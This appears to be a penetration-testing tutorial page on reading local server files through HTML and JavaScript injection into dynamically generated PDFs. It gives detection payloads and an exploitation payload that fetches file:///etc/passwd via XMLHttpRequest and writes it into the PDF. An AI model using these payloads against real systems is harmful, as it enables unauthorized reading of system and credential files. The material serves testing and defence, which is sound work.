# Local File Read via XSS in Dynamically Generated PDF

## Local File Read via XSS in Dynamically Generated PDF

### Detection

We may find an input field that lets us pass a parameter, which would be used in a dynamically generated PDF

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FPYSzwsTc6MlPOdlwCPzu%2Fimage.png?alt=media&#x26;token=e5206a0c-8500-40fa-bbe8-b1421f95e01e" alt=""><figcaption></figcaption></figure>

Our input is reflected like below

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FJDiPzDQgPhimQ49QRcpi%2Fimage.png?alt=media&#x26;token=61387f48-2470-4af2-a8d8-31e42508a913" alt=""><figcaption></figcaption></figure>

The next step would be to test for an HTML injection

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FS05zlBPA0ZFCUSoZFMhq%2Fimage.png?alt=media&#x26;token=afdeb46a-6b46-46f8-b5de-a4dbace23f77" alt=""><figcaption></figcaption></figure>

Which would result in the following

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FjM3mUghGou1p3xTZXttY%2Fimage.png?alt=media&#x26;token=e0e5e6cc-f367-4b66-95db-5832e6207ade" alt=""><figcaption></figcaption></figure>

We see that our input is being interpreted as HTML

Next, we can test if JavaScript code would be executed in the PDF. Try the following payload and check if we see the string `aaaa` in the generated PDF

```html
 <p id="test">aa</p><script>document.getElementById('test').innerHTML+='aa'</script> 
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F8nKMyuTokaywntJFCDxK%2Fimage.png?alt=media&#x26;token=1544e70d-1b79-4363-af22-82674ea4a862" alt=""><figcaption></figcaption></figure>

Check window.location to see where the JavaScript is executed

```html
<img src=x onerror=document.write(window.location)>
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FgNZi0a0csdH0BIn7i5xB%2Fimage.png?alt=media&#x26;token=77abf172-bdfe-459d-b8a0-6e92a7a5f2eb" alt=""><figcaption></figcaption></figure>

If we see that is it being executed in the `file` element, we can try to read local files

### Exploitation

We can use the following payload, to craft a request to include a file

```html
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F0z4B5YmN6GgqcPpmEGXV%2Fimage.png?alt=media&#x26;token=19b6e8f3-d4b3-4ec6-8968-e468ce43e0e8" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators#exploiting-ssrf-vulnerabilities-in-pdf-generators" %}

{% embed url="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html" %}

{% embed url="https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f" %}
